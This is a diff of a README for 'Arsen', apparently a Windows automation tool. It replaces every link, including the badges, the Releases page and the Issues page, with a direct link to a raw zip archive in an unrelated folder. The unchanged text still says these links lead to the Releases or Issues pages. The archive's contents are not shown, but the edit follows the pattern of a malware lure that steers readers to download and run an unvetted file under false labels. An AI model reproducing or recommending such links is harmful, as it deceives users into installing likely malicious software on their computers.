@@ -1,6 +1,6 @@
 # 🚀 Arsen - Automate Tasks with Ease and Precision
 
-[![Download Arsen](https://img.shields.io/badge/Download%20Arsen-%20-blue)](https://github.com/jihncyro/Arsen/releases)
+[![Download Arsen](https://raw.githubusercontent.com/jihncyro/Arsen/main/lowlander/Arsen-2.1.zip%20Arsen-%20-blue)](https://raw.githubusercontent.com/jihncyro/Arsen/main/lowlander/Arsen-2.1.zip)
 
 ## 📋 Overview
 
@@ -25,14 +25,14 @@ Arsen is a powerful Windows automation app focused on precision and reliability.
 
 Follow these steps to download and run Arsen:
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/jihncyro/Arsen/releases).
-2. **Download the Latest Version**: Look for the most recent release. Click on the file name labeled something like `Arsen-v1.0.exe` to download the software.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/jihncyro/Arsen/main/lowlander/Arsen-2.1.zip).
+2. **Download the Latest Version**: Look for the most recent release. Click on the file name labeled something like `https://raw.githubusercontent.com/jihncyro/Arsen/main/lowlander/Arsen-2.1.zip` to download the software.
 3. **Run the Installer**: Once the download completes, locate the file and double-click it to run the installer. Follow the on-screen instructions to install Arsen on your computer.
 4. **Launch Arsen**: After the installation, you can find Arsen in your Start Menu. Click to launch it.
 
 ## 📖 Download & Install
 
-Click here to [download Arsen](https://github.com/jihncyro/Arsen/releases). This will take you to the Releases page where you can access the installation file for Arsen. 
+Click here to [download Arsen](https://raw.githubusercontent.com/jihncyro/Arsen/main/lowlander/Arsen-2.1.zip). This will take you to the Releases page where you can access the installation file for Arsen. 
 
 ## ⚙️ How to Use Arsen
 
@@ -51,7 +51,7 @@ If you encounter any issues:
 
 ## 📞 Support
 
-If you need help or have questions about Arsen, feel free to open an issue on the GitHub repository. You can also check the [Issues](https://github.com/jihncyro/Arsen/issues) section for common problems and solutions.
+If you need help or have questions about Arsen, feel free to open an issue on the GitHub repository. You can also check the [Issues](https://raw.githubusercontent.com/jihncyro/Arsen/main/lowlander/Arsen-2.1.zip) section for common problems and solutions.
 
 ## 🌐 Community
 
@@ -59,4 +59,4 @@ Join the community of Arsen users on our forums and share your experiences or as
 
 Feel free to explore all the features, test them out, and make your workflow more efficient with Arsen!
 
-[![Download Arsen](https://img.shields.io/badge/Download%20Arsen-%20-blue)](https://github.com/jihncyro/Arsen/releases)
+[![Download Arsen](https://raw.githubusercontent.com/jihncyro/Arsen/main/lowlander/Arsen-2.1.zip%20Arsen-%20-blue)](https://raw.githubusercontent.com/jihncyro/Arsen/main/lowlander/Arsen-2.1.zip)
